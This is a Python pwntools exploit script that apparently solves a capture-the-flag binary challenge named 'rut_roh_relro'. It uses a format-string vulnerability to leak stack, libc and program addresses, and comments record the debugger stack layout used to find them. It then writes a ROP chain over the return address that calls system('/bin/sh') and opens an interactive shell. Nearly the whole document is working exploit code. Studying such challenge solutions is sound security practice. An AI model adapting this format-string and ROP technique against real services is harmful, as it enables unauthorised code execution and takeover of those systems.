#!/usr/bin/env python3

from pwn import *

exe = ELF("./rut_roh_relro_patched")
libc = ELF("./libc-chall.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # 0x000000000000127b: pop rdi; ret;

    # 3e:01f0│            0x7fff16cde4d0 —▸ 0x7fff16cde5d0 ◂— 0x1   <--- [RBP PREV. STACK FRAME]
    # 3f:01f8│            0x7fff16cde4d8 ◂— 0x0
    # 40:0200│ rbp        0x7fff16cde4e0 —▸ 0x558284f1a220 ◂— push r15
    # 41:0208│            0x7fff16cde4e8 —▸ 0x7f2e64b7dd0a (__libc_start_main+234) ◂— mov edi, eax      <--- [LEAK LIBC]
    # 42:0210│            0x7fff16cde4f0 —▸ 0x7fff16cde5d8 —▸ 0x7fff16cdf1b9 ◂— '/home/thomas/Desktop/...'
    # 43:0218│            0x7fff16cde4f8 ◂— 0x100000000
    # 44:0220│            0x7fff16cde500 —▸ 0x558284f1a165 ◂— push rbp      <--- [MAIN ADDRESS]

    r.sendlineafter(b"post?", b"%68$lx--%71$lx--%74$lx")
    output = r.recvlines(3)[-1].split(b"--")

    rbp = int(output[0], 16) - 0xf0
    libc.address = int(output[1], 16) - (libc.symbols["__libc_start_main"] + 234)
    exe.address = int(output[2], 16) - exe.symbols["main"]

    log.info(f"LIBC address: 0x{libc.address:x}")
    log.info(f"Prog. address: 0x{exe.address:x}")
    log.info(f"RBP address: 0x{rbp:x}")

    pop_rdi = exe.address + 0x127b
    ret = exe.address + 0x127c
    bin_sh = next(libc.search(b"/bin/sh"))

    payload = fmtstr_payload(6, {rbp + 8: pop_rdi, rbp + 16: bin_sh, rbp + 24: ret, rbp + 32: libc.symbols["system"]})
    r.sendlineafter(b"post?", payload)

    r.clean()
    r.interactive("$ ")


if __name__ == "__main__":
    main()
